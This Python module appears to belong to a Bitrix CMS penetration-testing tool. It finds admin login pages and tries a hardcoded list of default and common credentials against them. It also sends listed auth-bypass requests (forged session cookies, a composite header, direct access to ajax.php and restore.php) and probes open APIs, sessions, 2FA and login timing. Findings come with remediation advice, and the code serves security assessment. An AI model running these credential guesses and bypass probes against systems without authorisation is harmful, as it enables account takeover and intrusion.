#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Authentication Bypass and Brute Force Module for Bitrix Pentest Tool
Tests for: default creds, session issues, auth bypass, 2FA bypass, API auth
"""

import re
import base64
import hashlib
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class AuthFinding:
    """Authentication security finding"""
    severity: str  # critical, high, medium, low, info
    category: str  # default_creds, session, bypass, brute_force, api_auth, misconfig
    url: str
    description: str
    evidence: Optional[str] = None
    credentials: Optional[Dict[str, str]] = None  # Если найдены креды
    remediation: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        # Hide actual credentials in output
        if self.credentials:
            result['credentials'] = {k: '***' for k in self.credentials.keys()}
        return result


@dataclass
class AuthResult:
    """Results of authentication testing"""
    target: str
    findings: List[AuthFinding] = field(default_factory=list)
    valid_credentials: List[Dict] = field(default_factory=list)
    session_issues: List[Dict] = field(default_factory=list)
    bypass_vectors: List[Dict] = field(default_factory=list)
    api_endpoints: List[Dict] = field(default_factory=list)
    
    def add_finding(self, finding: AuthFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.category == 'default_creds' and finding.credentials:
            self.valid_credentials.append(finding_dict)
        elif finding.category == 'session':
            self.session_issues.append(finding_dict)
        elif finding.category == 'bypass':
            self.bypass_vectors.append(finding_dict)
        elif finding.category == 'api_auth':
            self.api_endpoints.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': sum(1 for f in self.findings if f.severity == 'high'),
                'medium': sum(1 for f in self.findings if f.severity == 'medium'),
                'valid_credentials_found': len(self.valid_credentials),
                'session_issues': len(self.session_issues),
                'bypass_vectors': len(self.bypass_vectors),
            },
            'valid_credentials': self.valid_credentials,
            'session_issues': self.session_issues,
            'bypass_vectors': self.bypass_vectors,
            'api_endpoints': self.api_endpoints,
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixAuthBypass:
    """
    Authentication testing module for Bitrix CMS
    """
    
    # Default credentials for Bitrix
    DEFAULT_CREDENTIALS = [
        # Стандартные комбинации
        {'login': 'admin', 'password': 'admin'},
        {'login': 'admin', 'password': 'bitrix'},
        {'login': 'admin', 'password': '123456'},
        {'login': 'admin', 'password': 'password'},
        {'login': 'admin', 'password': '12345678'},
        {'login': 'bitrix', 'password': 'bitrix'},
        {'login': 'bitrix', 'password': 'admin'},
        {'login': 'administrator', 'password': 'administrator'},
        {'login': 'administrator', 'password': 'admin'},
        {'login': 'user', 'password': 'user'},
        {'login': 'test', 'password': 'test'},
        {'login': 'demo', 'password': 'demo'},
        {'login': 'guest', 'password': 'guest'},
        
        # Популярные в Рунете
        {'login': 'admin', 'password': 'qwerty'},
        {'login': 'admin', 'password': '12345'},
        {'login': 'admin', 'password': '111111'},
        {'login': 'admin', 'password': 'master'},
        {'login': 'admin', 'password': '123123'},
        {'login': 'admin', 'password': 'qwe123'},
        {'login': 'admin', 'password': '1q2w3e'},
        
        # Пустые пароли
        {'login': 'admin', 'password': ''},
        {'login': 'bitrix', 'password': ''},
    ]
    
    # Auth endpoints
    AUTH_ENDPOINTS = [
        '/bitrix/admin/index.php',
        '/bitrix/admin/',
        '/?login=yes',
        '/auth/',
        '/login/',
        '/bitrix/components/bitrix/system.auth.form/',
    ]
    
    # API endpoints that might have auth issues
    API_ENDPOINTS = [
        '/rest/',
        '/api/',
        '/bitrix/services/rest/',
        '/bitrix/tools/sale_order_ajax.php',
        '/bitrix/tools/upload.php',
        '/bitrix/admin/1c_exchange.php',
        '/bitrix/admin/exchange_integration.php',
    ]
    
    # Session-related paths
    SESSION_PATHS = [
        '/bitrix/tools/public_session.php',
        '/bitrix/components/bitrix/main.userconsent.request/',
        '/bitrix/components/bitrix/socialnetwork/',
    ]
    
    # Known bypass vectors
    BYPASS_VECTORS = [
        {
            'name': 'PHPSESSID manipulation',
            'path': '/bitrix/admin/index.php',
            'method': 'GET',
            'headers': {'Cookie': 'PHPSESSID=fake_session_admin'},
            'check': 'admin_panel'
        },
        {
            'name': 'BITRIX_SM_GUEST_ID bypass',
            'path': '/bitrix/admin/',
            'method': 'GET',
            'headers': {'Cookie': 'BITRIX_SM_GUEST_ID=1; BITRIX_SM_LAST_VISIT=01-01-2024'},
            'check': 'redirect_check'
        },
        {
            'name': 'X-Bitrix-Composite bypass',
            'path': '/bitrix/admin/index.php',
            'method': 'GET',
            'headers': {'X-Bitrix-Composite': 'get_dynamic'},
            'check': 'content_check'
        },
        {
            'name': 'ajax.php direct access',
            'path': '/bitrix/admin/ajax.php',
            'method': 'GET',
            'check': 'ajax_response'
        },
        {
            'name': 'restore.php access',
            'path': '/bitrix/admin/restore.php',
            'method': 'GET',
            'check': 'backup_tool'
        },
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.csrf_tokens = {}
        
    def scan(self, target_url: str, aggressive: bool = False) -> AuthResult:
        """
        Main authentication testing method
        
        Args:
            target_url: Target base URL
            aggressive: Enable brute force and aggressive tests
        
        Returns:
            AuthResult with all findings
        """
        self.logger.info(f"Starting Authentication testing for {target_url}")
        result = AuthResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Find login forms and admin panels
        self.logger.info("Discovering authentication endpoints...")
        auth_urls = self._discover_auth_endpoints(base_url)
        
        # 2. Test for default credentials
        self.logger.info("Testing default credentials...")
        self._test_default_credentials(base_url, auth_urls, result)
        
        # 3. Test session management
        self.logger.info("Testing session management...")
        self._test_session_issues(base_url, result)
        
        # 4. Test known bypass vectors
        self.logger.info("Testing known bypass vectors...")
        self._test_bypass_vectors(base_url, result)
        
        # 5. Test API authentication
        self.logger.info("Testing API endpoints...")
        self._test_api_auth(base_url, result)
        
        # 6. Check for 2FA misconfigurations
        self.logger.info("Checking 2FA configuration...")
        self._check_2fa_issues(base_url, result)
        
        # 7. Aggressive tests
        if aggressive:
            self.logger.info("Running aggressive authentication tests...")
            self._aggressive_tests(base_url, auth_urls, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"Auth scan complete: {total} findings ({critical} critical)")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_auth_endpoints(self, base_url: str) -> List[str]:
        """Find all authentication endpoints"""
        found = []
        
        for path in self.AUTH_ENDPOINTS:
            url = urljoin(base_url, path)
            resp = self.requester.get(url, allow_redirects=True)
            
            if not resp:
                continue
            
            # Check if it's auth page
            if self._is_auth_page(resp.text, resp.url):
                found.append(resp.url)
                self.logger.info(f"Auth endpoint found: {resp.url}")
                
                # Extract CSRF token if present
                token = self.parser.extract_bitrix_sessid(resp.text)
                if token:
                    self.csrf_tokens[resp.url] = token
                    self.logger.debug(f"CSRF token found: {token[:8]}...")
        
        return list(set(found))
    
    def _is_auth_page(self, content: str, url: str) -> bool:
        """Determine if page is authentication form"""
        indicators = [
            'name="USER_LOGIN"',
            'name="USER_PASSWORD"',
            'name="Login"',
            'bitrix_sessid',
            'Авторизация',
            'Authorization',
            'Вход на сайт',
            'Login form',
            'id="bx_auth_form"',
            'class="bx-auth"',
        ]
        
        content_lower = content.lower()
        return any(ind.lower() in content_lower for ind in indicators)
    
    def _test_default_credentials(self, base_url: str, auth_urls: List[str], result: AuthResult):
        """Test default credentials against found endpoints"""
        if not auth_urls:
            # Try default admin URL
            auth_urls = [urljoin(base_url, '/bitrix/admin/index.php')]
        
        for auth_url in auth_urls:
            for creds in self.DEFAULT_CREDENTIALS:
                # Skip empty passwords in non-aggressive mode
                if not creds['password']:
                    continue
                
                success, evidence = self._try_login(auth_url, creds)
                
                if success:
                    finding = AuthFinding(
                        severity='critical',
                        category='default_creds',
                        url=auth_url,
                        description=f"Default credentials valid: {creds['login']}/{creds['password']}",
                        evidence=evidence,
                        credentials=creds,
                        remediation="Change default passwords immediately!"
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! DEFAULT CREDS WORK: {creds['login']}/{creds['password']} at {auth_url}")
                    return  # Stop on first valid creds
                
                self.logger.debug(f"Failed: {creds['login']}/{creds['password']}")
    
    def _try_login(self, url: str, creds: Dict[str, str]) -> Tuple[bool, Optional[str]]:
        """Attempt login with credentials"""
        # Prepare login data
        login_data = {
            'USER_LOGIN': creds['login'],
            'USER_PASSWORD': creds['password'],
            'AUTH_FORM': 'Y',
            'TYPE': 'AUTH',
            'Login': 'Войти',
        }
        
        # Add CSRF token if available
        if url in self.csrf_tokens:
            login_data['sessid'] = self.csrf_tokens[url]
        
        # Try POST login
        resp = self.requester.post(url, data=login_data, allow_redirects=True)
        
        if not resp:
            return False, None
        
        # Check for successful login indicators
        success_indicators = [
            '/bitrix/admin/index.php',
            'bitrix_admin',
            'ADMIN_SECTION',
            'logout=yes',
            'Главная страница',
            'Панель управления',
            'Dashboard',
        ]
        
        content = resp.text
        
        # Check redirect
        if resp.url != url and 'admin' in resp.url:
            return True, f"Redirect to: {resp.url}"
        
        # Check content
        for indicator in success_indicators:
            if indicator in content:
                return True, f"Indicator found: {indicator}"
        
        # Check for error messages (failed login)
        error_indicators = [
            'Неверный логин или пароль',
            'Invalid login or password',
            'Ошибка авторизации',
            'Login incorrect',
            'access denied',
        ]
        
        for error in error_indicators:
            if error.lower() in content.lower():
                return False, None
        
        # Ambiguous result
        return False, None
    
    def _test_session_issues(self, base_url: str, result: AuthResult):
        """Test for session management vulnerabilities"""
        
        # 1. Check session fixation
        test_url = urljoin(base_url, '/bitrix/admin/index.php')
        
        # Get initial session
        resp1 = self.requester.get(test_url)
        if resp1 and 'set-cookie' in resp1.headers:
            initial_session = self._extract_session_cookie(resp1.headers['set-cookie'])
            
            # Try to reuse session after "logout"
            resp2 = self.requester.get(urljoin(base_url, '/?logout=yes'))
            resp3 = self.requester.get(test_url)
            
            if resp3 and self._is_logged_in(resp3.text):
                finding = AuthFinding(
                    severity='high',
                    category='session',
                    url=test_url,
                    description="Session not invalidated after logout (session fixation)",
                    evidence=f"Session {initial_session[:8]}... still valid",
                    remediation="Regenerate session ID after authentication state change"
                )
                result.add_finding(finding)
                self.logger.warning(f"Session fixation issue detected")
        
        # 2. Check for predictable session IDs
        sessions = []
        for _ in range(3):
            resp = self.requester.get(test_url)
            if resp and 'set-cookie' in resp.headers:
                sid = self._extract_session_cookie(resp.headers['set-cookie'])
                if sid:
                    sessions.append(sid)
        
        if len(sessions) >= 2:
            # Check entropy
            if self._check_session_entropy(sessions):
                finding = AuthFinding(
                    severity='medium',
                    category='session',
                    url=test_url,
                    description="Session IDs may have insufficient entropy",
                    evidence=f"Sample sessions: {[s[:8] + '...' for s in sessions]}",
                    remediation="Use cryptographically secure random session IDs"
                )
                result.add_finding(finding)
        
        # 3. Check for session in URL
        resp = self.requester.get(urljoin(base_url, '/?PHPSESSID=test123'))
        if resp and 'PHPSESSID=test123' in resp.text:
            finding = AuthFinding(
                severity='medium',
                category='session',
                url=base_url,
                description="Session ID accepted in URL (susceptible to session hijacking)",
                evidence="PHPSESSID in URL parameter",
                remediation="Disable session.use_trans_sid in PHP config"
            )
            result.add_finding(finding)
    
    def _extract_session_cookie(self, cookie_header: str) -> Optional[str]:
        """Extract PHPSESSID from cookie header"""
        match = re.search(r'PHPSESSID=([^;]+)', cookie_header)
        return match.group(1) if match else None
    
    def _is_logged_in(self, content: str) -> bool:
        """Check if response indicates logged-in state"""
        indicators = ['logout=yes', '/bitrix/admin/', 'Панель управления', 'Dashboard']
        return any(ind in content for ind in indicators)
    
    def _check_session_entropy(self, sessions: List[str]) -> bool:
        """Check if session IDs have low entropy"""
        if len(sessions) < 2:
            return False
        
        # Check length
        lengths = [len(s) for s in sessions]
        if max(lengths) < 20:
            return True
        
        # Check similarity
        common_prefix = len(os.path.commonprefix(sessions))
        if common_prefix > 5:
            return True
        
        return False
    
    def _test_bypass_vectors(self, base_url: str, result: AuthResult):
        """Test known authentication bypass vectors"""
        for vector in self.BYPASS_VECTORS:
            url = urljoin(base_url, vector['path'])
            
            if vector['method'] == 'GET':
                resp = self.requester.get(url, headers=vector.get('headers', {}))
            else:
                resp = self.requester.post(url, headers=vector.get('headers', {}))
            
            if not resp:
                continue
            
            # Check if bypass worked
            bypassed = False
            evidence = None
            
            if vector['check'] == 'admin_panel':
                if 'form_auth' not in resp.text and ('admin' in resp.text or 'bitrix' in resp.text):
                    bypassed = True
                    evidence = "Admin content accessible without auth"
            
            elif vector['check'] == 'redirect_check':
                if resp.status_code in [301, 302] and 'login' not in resp.headers.get('Location', ''):
                    bypassed = True
                    evidence = f"Redirect to: {resp.headers.get('Location')}"
            
            elif vector['check'] == 'content_check':
                if resp.status_code == 200 and len(resp.text) > 1000:
                    bypassed = True
                    evidence = "Large response without authentication"
            
            elif vector['check'] == 'ajax_response':
                if resp.status_code == 200 and ('json' in resp.headers.get('Content-Type', '') or 
                                                  '{' in resp.text):
                    bypassed = True
                    evidence = "AJAX endpoint responded without auth"
            
            elif vector['check'] == 'backup_tool':
                if resp.status_code == 200 and ('restore' in resp.text or 'backup' in resp.text):
                    bypassed = True
                    evidence = "Backup restore tool accessible"
            
            if bypassed:
                finding = AuthFinding(
                    severity='critical',
                    category='bypass',
                    url=url,
                    description=f"Auth bypass possible: {vector['name']}",
                    evidence=evidence,
                    remediation="Restrict access to admin endpoints, update Bitrix"
                )
                result.add_finding(finding)
                self.logger.critical(f"!!! BYPASS FOUND: {vector['name']} at {url}")
    
    def _test_api_auth(self, base_url: str, result: AuthResult):
        """Test API endpoint authentication"""
        for path in self.API_ENDPOINTS:
            url = urljoin(base_url, path)
            
            # Test without auth
            resp = self.requester.get(url, allow_redirects=False)
            
            if not resp:
                continue
            
            if resp.status_code == 200:
                content = resp.text
                
                # Check if it's actually data (not auth error)
                if len(content) > 100 and 'error' not in content.lower():
                    finding = AuthFinding(
                        severity='high',
                        category='api_auth',
                        url=url,
                        description="API endpoint accessible without authentication",
                        evidence=f"Response size: {len(content)} bytes",
                        remediation="Enable authentication for API endpoints"
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! OPEN API: {url}")
                
                elif 'error' in content.lower() and 'auth' in content.lower():
                    # Check what auth methods accepted
                    auth_methods = self._check_api_auth_methods(url)
                    if auth_methods:
                        finding = AuthFinding(
                            severity='info',
                            category='api_auth',
                            url=url,
                            description=f"API requires auth, methods: {', '.join(auth_methods)}",
                            evidence=None,
                            remediation=None
                        )
                        result.add_finding(finding)
            
            # Test for OPTIONS (CORS)
            options_resp = self.requester.options(url)
            if options_resp and 'access-control-allow-origin' in options_resp.headers:
                cors = options_resp.headers['access-control-allow-origin']
                finding = AuthFinding(
                    severity='low' if cors != '*' else 'medium',
                    category='api_auth',
                    url=url,
                    description=f"CORS enabled: {cors}",
                    evidence=f"Access-Control-Allow-Origin: {cors}",
                    remediation="Restrict CORS to specific origins"
                )
                result.add_finding(finding)
    
    def _check_api_auth_methods(self, url: str) -> List[str]:
        """Determine what authentication methods API accepts"""
        methods = []
        
        # Test Basic Auth
        test_auth = base64.b64encode(b'test:test').decode()
        resp = self.requester.get(url, headers={'Authorization': f'Basic {test_auth}'})
        if resp and resp.status_code != 401:
            methods.append('Basic')
        
        # Test Bearer token
        resp = self.requester.get(url, headers={'Authorization': 'Bearer test'})
        if resp and resp.status_code != 401:
            methods.append('Bearer')
        
        # Test API key in header
        resp = self.requester.get(url, headers={'X-API-Key': 'test'})
        if resp and resp.status_code != 401:
            methods.append('API-Key')
        
        return methods
    
    def _check_2fa_issues(self, base_url: str, result: AuthResult):
        """Check for 2FA bypass or misconfiguration"""
        # Check if 2FA is enforced
        login_url = urljoin(base_url, '/bitrix/admin/index.php')
        resp = self.requester.get(login_url)
        
        if not resp:
            return
        
        content = resp.text
        
        # Check for 2FA fields
        has_2fa_field = any(field in content for field in 
                          ['OTP_PASSWORD', 'otp', '2fa', 'two_factor', 'код подтверждения'])
        
        if has_2fa_field:
            self.logger.info("2FA is configured")
            
            # Check if 2FA can be bypassed via backup codes
            if 'backup' in content.lower() or 'резервный' in content.lower():
                finding = AuthFinding(
                    severity='medium',
                    category='misconfig',
                    url=login_url,
                    description="2FA backup codes might be weak or reusable",
                    evidence="Backup codes option present",
                    remediation="Ensure backup codes are single-use and cryptographically random"
                )
                result.add_finding(finding)
        else:
            # No 2FA on admin panel
            finding = AuthFinding(
                severity='medium',
                category='misconfig',
                url=login_url,
                description="2FA not enforced on admin panel",
                evidence="No OTP/2FA fields found in login form",
                remediation="Enable 2FA for all administrative accounts"
            )
            result.add_finding(finding)
    
    def _aggressive_tests(self, base_url: str, auth_urls: List[str], result: AuthResult):
        """Aggressive tests - timing attacks, user enumeration"""
        
        # User enumeration via timing
        test_users = ['admin', 'bitrix', 'test', 'administrator', 'user1']
        timings = []
        
        for user in test_users:
            start = time.time()
            resp = self._try_login(
                auth_urls[0] if auth_urls else urljoin(base_url, '/bitrix/admin/index.php'),
                {'login': user, 'password': 'WrongPassword123!'}
            )
            elapsed = time.time() - start
            timings.append((user, elapsed))
        
        # Check for timing differences
        if len(timings) >= 2:
            times = [t[1] for t in timings]
            max_diff = max(times) - min(times)
            
            if max_diff > 1.0:  # More than 1 second difference
                finding = AuthFinding(
                    severity='medium',
                    category='brute_force',
                    url=base_url,
                    description="User enumeration possible via timing attack",
                    evidence=f"Timing variance: {max_diff:.2f}s",
                    remediation="Ensure constant-time password comparison"
                )
                result.add_finding(finding)
        
        # Test for account lockout
        self.logger.info("Testing account lockout policy...")
        # This would require multiple attempts, skipped in basic version


# Import for entropy check
import os
import time


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    # Test
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixAuthBypass(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Credentials found: {len(result.valid_credentials)}")
        print(f"Bypass vectors: {len(result.bypass_vectors)}")